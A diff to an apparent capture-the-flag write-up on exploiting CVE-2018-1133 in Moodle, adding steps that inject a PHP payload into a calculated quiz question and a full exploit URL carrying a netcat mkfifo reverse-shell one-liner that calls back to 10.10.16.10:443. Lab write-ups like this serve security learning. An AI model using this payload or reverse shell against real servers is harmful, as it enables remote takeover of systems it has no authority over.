@@ -79,7 +79,20 @@ CVE-2018-1133 was a vulnerability that allows any user in the teacher role to ge
 
 That means we can use this payload in the quiz creating page
 
+Firstly we can add a quiz:
+![](images/Pasted%20image%2020241121050814.png)
 
+![](images/Pasted%20image%2020241121050914.png)
+A new calculated type question is added in order to inject arbitrary PHP code in the answer of the question, in order to perform a Remote Code Execution.
+
+In the following example, the payload `/*{a*/`$_GET[0]`;//{x}}` is added.
+![](images/Pasted%20image%2020241121050951.png)
+
+I’ll use this RCE to get a shell, grabbing my go to from the reverse shell cheat sheet, adding `0=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc 10.10.16.10 443 >/tmp/f` to the end of the url. I did have to encode the & so that it wasn’t treated as another parameter. 
+```
+http://10.10.10.153/moodle/question/question.php?returnurl=/mod/quiz/edit.php?cmid=7&addonpage=0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7&0=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.10 443 >/tmp/f
+```
+Remember open the netcat to handle the revershell.
 
 2,switch to the valid user
 when we successfully get the shell, we would be in `/var/www/html/moodle/question`
